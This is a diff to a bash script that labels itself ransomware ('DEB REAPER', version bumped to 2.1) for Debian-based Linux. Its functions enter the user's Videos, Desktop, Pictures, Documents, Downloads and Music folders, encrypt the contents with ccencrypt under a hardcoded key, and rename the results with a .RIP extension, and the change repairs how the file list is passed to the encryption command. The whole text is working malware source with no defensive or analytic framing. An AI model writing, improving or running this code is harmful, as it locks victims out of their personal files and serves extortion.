@@ -27,7 +27,7 @@
 # This ransomware works only on Debian based distributions.
 # Tested on Linux (Ubuntu, Debian).
 
-# DEB REAPER v2.0
+# DEB REAPER v2.1
 
 
 KEY="ReAPER" # KEY
@@ -53,7 +53,7 @@ function encryptvideos() {
    cd "$HOME"
    cd Videos
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | tr -d '\n')
+   local LIST=$(echo "$LS" | tr "\n" " ")
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -66,7 +66,7 @@ function encryptdesktop() {
    cd "$HOME"
    cd Desktop
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | tr -d '\n')
+   local LIST=$(echo "$LS" | tr "\n" " ")
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -79,7 +79,7 @@ function encryptpictures() {
    cd "$HOME"
    cd Pictures
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | tr -d '\n')
+   local LIST=$(echo "$LS" | tr "\n" " ")
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -92,7 +92,7 @@ function encryptdocuments() {
    cd "$HOME"
    cd Documents
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | tr -d '\n')
+   local LIST=$(echo "$LS" | tr "\n" " ")
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -105,7 +105,7 @@ function encryptdownloads() {
    cd "$HOME"
    cd Downloads
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | tr -d '\n')
+   local LIST=$(echo "$LS" | tr "\n" " ")
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -118,7 +118,7 @@ function encryptmusic() {
    cd "$HOME"
    cd Music
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | tr -d '\n')
+   local LIST=$(echo "$LS" | tr "\n" " ")
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
